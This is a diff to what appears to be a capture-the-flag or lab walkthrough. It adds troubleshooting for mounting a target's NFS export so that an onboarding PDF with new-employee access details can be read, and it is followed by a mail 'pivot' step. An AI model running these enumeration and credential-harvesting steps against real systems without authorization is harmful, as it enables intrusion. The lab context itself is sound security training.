@@ -59,6 +59,30 @@ sudo mount -t nfs 10.129.4.140:/srv/nfs/onboarding /mnt/enigma -o nolock
 pdftotext /mnt/enigma/New_Employee_Access.pdf -
 ```
 
+> **If `mount -t nfs` fails with `access denied by server while mounting`:**
+> `showmount -e` proves the server is reachable, so the refusal is from mountd.
+> Causes: NFS version mismatch (mount.nfs defaults to **4.2**, the export is
+> usually **3**) or the privileged-source-port requirement (`secure`, which
+> WSL2's NFS client frequently trips over). Fixes, in order:
+> ```bash
+> # a) no mount at all - talk NFS directly with libnfs
+> sudo apt install -y libnfs-utils poppler-utils
+> nfs-ls  -D nfs://10.129.4.140
+> nfs-ls     nfs://10.129.4.140/srv/nfs/onboarding
+> nfs-cat    nfs://10.129.4.140/srv/nfs/onboarding/New_Employee_Access.pdf > /tmp/new.pdf
+> pdftotext /tmp/new.pdf -
+>
+> # b) force version + reserved port
+> sudo mount -t nfs -o vers=3,resvport,nolock,proto=tcp,mountproto=tcp,port=2049 \
+>   10.129.4.140:/srv/nfs/onboarding /mnt/enigma
+>
+> # c) all of the above automatically
+> ./02_nfs_fallback.sh 10.129.4.140
+> ```
+> If every attempt still says *access denied*, run the commands from a real
+> Kali VM (VirtualBox/VMware) instead of WSL — WSL2's NFS client is the usual
+> culprit for `illegal port` refusals.
+
 ### 3. Mail pivot
 ```bash
 openssl s_client -connect 10.129.4.140:993 -quiet
